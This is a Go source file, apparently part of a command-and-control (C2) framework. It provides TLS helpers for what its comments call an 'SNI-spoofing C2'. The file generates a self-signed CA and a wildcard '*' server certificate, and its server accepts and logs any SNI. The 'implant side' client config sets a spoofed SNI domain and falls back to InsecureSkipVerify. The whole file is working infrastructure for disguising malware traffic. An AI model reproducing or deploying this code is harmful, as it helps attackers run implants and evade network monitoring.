// Package tlsutil provides shared TLS utilities for the SNI-spoofing C2.
//
// It handles self-signed certificate generation, TLS configuration for
// both the server (accepts any SNI) and the client (spoofs the SNI),
// and helpers for logging the ClientHello SNI value.
package tlsutil

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"fmt"
	"math/big"
	"os"
	"time"
)

// ---------- CA + Server certificate generation ----------

// GenerateCA creates a self-signed CA key and certificate (10 year validity).
func GenerateCA() (*ecdsa.PrivateKey, *x509.Certificate, error) {
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return nil, nil, fmt.Errorf("generating CA key: %w", err)
	}

	serial, err := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
	if err != nil {
		return nil, nil, fmt.Errorf("generating CA serial: %w", err)
	}

	template := &x509.Certificate{
		SerialNumber: serial,
		Subject: pkix.Name{
			Organization: []string{"C2 SNI Spoof CA"},
			CommonName:   "C2 SNI Spoof CA",
		},
		NotBefore:             time.Now().Add(-24 * time.Hour),
		NotAfter:              time.Now().Add(3650 * 24 * time.Hour),
		KeyUsage:              x509.KeyUsageCertSign | x509.KeyUsageDigitalSignature,
		BasicConstraintsValid: true,
		IsCA:                  true,
		MaxPathLen:            1,
	}

	certDER, err := x509.CreateCertificate(rand.Reader, template, template, &key.PublicKey, key)
	if err != nil {
		return nil, nil, fmt.Errorf("creating CA certificate: %w", err)
	}

	cert, err := x509.ParseCertificate(certDER)
	if err != nil {
		return nil, nil, fmt.Errorf("parsing CA certificate: %w", err)
	}

	return key, cert, nil
}

// GenerateServerCert creates a server certificate signed by the provided CA.
// The certificate includes a wildcard DNSName so it's valid for any hostname.
func GenerateServerCert(caKey *ecdsa.PrivateKey, caCert *x509.Certificate) (*ecdsa.PrivateKey, *x509.Certificate, error) {
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return nil, nil, fmt.Errorf("generating server key: %w", err)
	}

	serial, err := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
	if err != nil {
		return nil, nil, fmt.Errorf("generating server serial: %w", err)
	}

	template := &x509.Certificate{
		SerialNumber: serial,
		Subject: pkix.Name{
			Organization: []string{"C2 SNI Spoof Server"},
			CommonName:   "C2 Server",
		},
		NotBefore: time.Now().Add(-24 * time.Hour),
		NotAfter:  time.Now().Add(3650 * 24 * time.Hour),
		KeyUsage:  x509.KeyUsageDigitalSignature,
		ExtKeyUsage: []x509.ExtKeyUsage{
			x509.ExtKeyUsageServerAuth,
		},
		// Wildcard so it validates against any SNI the client sends.
		DNSNames: []string{"*"},
	}

	certDER, err := x509.CreateCertificate(rand.Reader, template, caCert, &key.PublicKey, caKey)
	if err != nil {
		return nil, nil, fmt.Errorf("creating server certificate: %w", err)
	}

	cert, err := x509.ParseCertificate(certDER)
	if err != nil {
		return nil, nil, fmt.Errorf("parsing server certificate: %w", err)
	}

	return key, cert, nil
}

// ---------- PEM save / load helpers ----------

// SaveCertToFile writes a certificate as PEM.
func SaveCertToFile(cert *x509.Certificate, path string) error {
	f, err := os.Create(path)
	if err != nil {
		return fmt.Errorf("creating %s: %w", path, err)
	}
	defer f.Close()
	return pem.Encode(f, &pem.Block{Type: "CERTIFICATE", Bytes: cert.Raw})
}

// SaveKeyToFile writes an ECDSA private key as PEM (SEC1 / PKCS8-style).
func SaveKeyToFile(key *ecdsa.PrivateKey, path string) error {
	keyBytes, err := x509.MarshalECPrivateKey(key)
	if err != nil {
		return fmt.Errorf("marshaling EC key: %w", err)
	}
	f, err := os.Create(path)
	if err != nil {
		return fmt.Errorf("creating %s: %w", path, err)
	}
	defer f.Close()
	return pem.Encode(f, &pem.Block{Type: "EC PRIVATE KEY", Bytes: keyBytes})
}

// LoadCertFromFile reads a PEM certificate.
func LoadCertFromFile(path string) (*x509.Certificate, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("reading %s: %w", path, err)
	}
	block, _ := pem.Decode(data)
	if block == nil {
		return nil, fmt.Errorf("no PEM block in %s", path)
	}
	return x509.ParseCertificate(block.Bytes)
}

// LoadKeyFromFile reads an ECDSA PEM private key.
func LoadKeyFromFile(path string) (*ecdsa.PrivateKey, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("reading %s: %w", path, err)
	}
	block, _ := pem.Decode(data)
	if block == nil {
		return nil, fmt.Errorf("no PEM block in %s", path)
	}
	return x509.ParseECPrivateKey(block.Bytes)
}

// LoadOrGenerateTLSConfig loads server TLS credentials from disk, or
// auto-generates a fresh CA + server cert chain and saves to the given paths.
// Returns a *tls.Config suitable for the TLS server.
func LoadOrGenerateTLSConfig(certFile, keyFile, caFile string) (*tls.Config, error) {
	// Check if both server cert and key exist.
	if _, err := os.Stat(certFile); err == nil {
		if _, err := os.Stat(keyFile); err == nil {
			cert, err := tls.LoadX509KeyPair(certFile, keyFile)
			if err == nil {
				return &tls.Config{
					Certificates: []tls.Certificate{cert},
				}, nil
			}
			fmt.Fprintf(os.Stderr, "warning: could not load key pair (%v), regenerating\n", err)
		}
	}

	caKey, caCert, err := GenerateCA()
	if err != nil {
		return nil, fmt.Errorf("generating CA: %w", err)
	}
	serverKey, serverCert, err := GenerateServerCert(caKey, caCert)
	if err != nil {
		return nil, fmt.Errorf("generating server cert: %w", err)
	}

	// Persist everything.
	if err := SaveCertToFile(caCert, caFile); err != nil {
		return nil, err
	}
	if err := SaveCertToFile(serverCert, certFile); err != nil {
		return nil, err
	}
	if err := SaveKeyToFile(serverKey, keyFile); err != nil {
		return nil, err
	}

	tlsCert := tls.Certificate{
		Certificate: [][]byte{serverCert.Raw},
		PrivateKey:  serverKey,
	}
	return &tls.Config{
		Certificates: []tls.Certificate{tlsCert},
	}, nil
}

// ServerTLSConfig returns a *tls.Config that accepts connections with any SNI
// and logs the SNI via GetConfigForClient for monitoring purposes.
func ServerTLSConfig(certFile, keyFile, caFile string) (*tls.Config, error) {
	cfg, err := LoadOrGenerateTLSConfig(certFile, keyFile, caFile)
	if err != nil {
		return nil, err
	}
	cfg.GetConfigForClient = func(hello *tls.ClientHelloInfo) (*tls.Config, error) {
		// We log the SNI here; return nil to use the base config.
		if hello.ServerName != "" {
			fmt.Fprintf(os.Stderr, "[sni-log] ClientHello SNI: %s\n", hello.ServerName)
		}
		return nil, nil
	}
	return cfg, nil
}

// ClientTLSConfig builds a *tls.Config for the implant side.
// The ServerName is set to the spoofed domain.
// If a CA file is present the client will verify against it; otherwise
// InsecureSkipVerify is used (typical for self-signed certs).
func ClientTLSConfig(sniDomain, caFile string) (*tls.Config, error) {
	cfg := &tls.Config{
		ServerName: sniDomain,
	}

	if data, err := os.ReadFile(caFile); err == nil {
		pool := x509.NewCertPool()
		if pool.AppendCertsFromPEM(data) {
			cfg.RootCAs = pool
			return cfg, nil
		}
	}
	// Fall back to insecure (no CA verification) — common for C2 implants.
	cfg.InsecureSkipVerify = true
	return cfg, nil
}

// ExtractSNI returns the SNI value from a server-side TLS connection after
// the handshake completes.  Will be empty if the client sent no SNI.
func ExtractSNI(conn *tls.Conn) string {
	return conn.ConnectionState().ServerName
}
